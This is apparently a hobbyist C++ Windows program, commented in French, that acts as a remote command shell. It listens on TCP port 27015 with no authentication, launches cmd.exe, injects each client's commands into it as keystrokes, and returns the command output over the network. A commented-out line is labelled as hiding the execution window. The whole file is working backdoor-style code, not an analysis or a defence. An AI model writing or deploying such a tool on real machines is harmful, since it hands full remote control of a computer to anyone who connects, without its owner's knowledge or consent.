#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define _WINSOCK_DEPRECATED_NO_WARNINGS

// Importations initiales

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#include <iostream>
#include <vector>
#include <sstream>
#include <filesystem>
#include <fstream>
#include <shellapi.h>

#pragma comment(lib, "Ws2_32.lib")

// Namespaces

using namespace std;
namespace fs = filesystem;

// M�thode de v�rification des bytesRecv
bool bytesVerification(int bytesReceveid) {

	if (bytesReceveid <= 0) {
		cout << "Une erreur de reception s'est produite" << endl;
		// TODO : Socket close et retirer du master fd_set
		return false;
	}
	return true;
}


// Main
int main() {

	// Cacher la fênêtre d'execution
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//ShowWindow(GetConsoleWindow(), SW_RESTORE);

	// String pr�-enregistr�s

	const string servMsg = "<SERVER> ";
	const string clientMsg = "<CLIENT> ";
	const string errorMsg = "<ERROR> ";

	// Initialisation de WinShock

	WSADATA wsaData;

	int wsaStartup = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (wsaStartup != 0) {
		cout << errorMsg << "Impossible d'initialiser WinSock!" << endl;
		WSACleanup();
		return 0;
	}

	// Initialisation du Socket

	SOCKET listeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (listeningSocket == INVALID_SOCKET) {
		cout << errorMsg << "Impossible de creer le socket!" << endl;
		WSACleanup();
		return 0;
	}

	// Lier un ip adresse et un port au socket

	sockaddr_in saServer;

	saServer.sin_family = AF_INET;			// Adressage de la famille
	saServer.sin_addr.s_addr = INADDR_ANY;	// Adresse
	saServer.sin_port = htons(27015);		// Port

	bind(listeningSocket, (SOCKADDR*)&saServer, sizeof(saServer));

	// Mettre WinSock en mode �coute (Un thread, mais peut supporter plusieurs clients)

	listen(listeningSocket, SOMAXCONN);

	fd_set master;
	FD_ZERO(&master);

	FD_SET(listeningSocket, &master); // Arbre des sockets

	while (true) {

		fd_set copyMaster = master; // copyMaster permet de conserver un original du master (Important)

		int socketCount = select(0, &copyMaster, nullptr, nullptr, nullptr);

		for (int i = 0; i < socketCount; i++) {

			SOCKET sock = copyMaster.fd_array[i];

			if (sock == listeningSocket) {

				// Cr�ation du socket client

				sockaddr_in client;
				SOCKET clientSocket;
				int clientSize = sizeof(client);

				// Donne acc�s au client � se connecter
				clientSocket = accept(listeningSocket, (sockaddr*)&client, &clientSize);

				// Ajoute la nouvelle connexion dans la liste des clients connect�s
				FD_SET(clientSocket, &master);

				// Envoie un message de confirmation au client

				string welcome = "La connexion a ete etablie!";
				send(clientSocket, welcome.c_str(), (int)welcome.size() + 1, 0);

				// Ouverture de la console CMD

				HINSTANCE instanceCMD;

				instanceCMD = ShellExecute(NULL, L"open", L"cmd.exe", NULL, NULL, SW_SHOWNORMAL);

				if (instanceCMD <= (HINSTANCE)32) {
					cout << errorMsg << "Le lancement du CMD a echoue. Erreur #" << GetLastError() << endl;
					closesocket(sock);
					FD_CLR(sock, &master);
				}

				// Affichage de la connexion du client dans la console du serveur

				char host[NI_MAXHOST];
				char service[NI_MAXSERV];

				ZeroMemory(host, NI_MAXHOST);
				ZeroMemory(service, NI_MAXSERV);

				if (getnameinfo((sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0)
					cout << servMsg << host << " est connecte au port #" << service << endl;
				else {
					inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
					cout << servMsg << host << " est connecte au port #" << ntohs(client.sin_port) << endl;
				}
			}

			// Nous souhaitons communiquer avec un socketClient d�j� existant

			else {

				// Variables

				HWND windowCMD;

				char buf[4096];
				int bytesReceived = 0;

				string commande = "";
				
				const string path = "output.txt";
				const string errorPath = "error.txt";
				long fileSize = 0;

				// On recoit les commandes du client

				ZeroMemory(buf, 4096);
				bytesReceived = recv(sock, buf, 4096, 0);

				if (bytesVerification(bytesReceived)) {

					commande = string(buf, 0, bytesReceived);
					cout << clientMsg <<"La commande a executer est " << commande << endl;

					// On execute la commande du client dans le CMD

					windowCMD = FindWindow(L"ConsoleWindowClass", L"C:\\WINDOWS\\system32\\cmd.exe");

					commande += " > " + path + " 2> " + errorPath;

					for (auto c : commande) {
						SendMessage(windowCMD, WM_CHAR, c, NULL);
					}
					SendMessage(windowCMD, WM_CHAR, '\r', NULL);
				}
				
				Sleep(1000); // Très important !!!!

				// Lecture et envoie du ouput du CMD

				ifstream file(path, ios::binary);

				if (file.is_open()) {

					Sleep(1000); // Très important !!!

					cout << file.rdbuf() << endl; // Affichage du contenu du "output.txt"

					cout << servMsg << "Fichier ouvert!" << endl;

					// Envoyer la taille (octets) du fichier

					file.seekg(0, ios::end);
					fileSize = file.tellg();
					cout << servMsg << "La taille du fichier est de " << (int)fileSize << endl;

					// Vérification s'il n'y pas eu une erreur

					if ((int)fileSize > 0 ) {
						send(sock, (char*)&fileSize, sizeof(long), 0);

						// Recevoir un message de confirmation du client (On se fou du message / pas obligé de l'afficher)

						ZeroMemory(buf, 4096);
						bytesReceived = recv(sock, buf, 4096, 0);
						cout << clientMsg << "Confirmation obtenue!" << endl;
						ZeroMemory(buf, 4096);

						// Envoyer le fichier partie par partie

						file.seekg(0, ios::beg);

						do {

							// Lecture du fichier et envoie

							file.read(buf, 4096);

							if (file.gcount() > 0)
								send(sock, buf, file.gcount(), 0);

						} while (file.gcount() > 0);

						cout << servMsg << "Envoie termine!" << endl;
					}
					else { // Il y a une erreur

						file.close();
						
						file.open(errorPath, ios::binary);

						file.seekg(0, ios::end);
						fileSize = file.tellg();
						cout << servMsg << "La taille du fichier erreur est de " << (int)fileSize << endl;

						if (file.is_open()) {
							
							send(sock, (char*)&fileSize, sizeof(long), 0);

							// Recevoir un message de confirmation du client (On se fou du message / pas obligé de l'afficher)

							ZeroMemory(buf, 4096);
							bytesReceived = recv(sock, buf, 4096, 0);
							cout << clientMsg << "Confirmation obtenue!" << endl;
							ZeroMemory(buf, 4096);

							// Envoyer le fichier partie par partie

							file.seekg(0, ios::beg);

							do {

								// Lecture du fichier et envoie

								file.read(buf, 4096);

								if (file.gcount() > 0)
									send(sock, buf, file.gcount(), 0);

							} while (file.gcount() > 0);

							cout << servMsg << "Envoie termine!" << endl;
						}
					}
					
					file.clear(); // Clear juste avant de recommencer, ca va permettre la gestion des erreurs

					file.close();


				}
				else
					cout << errorMsg << "Erreur lors de l'ouverture" << endl;
			}
		}
	}

	// M�nage de WinSock
	WSACleanup();
}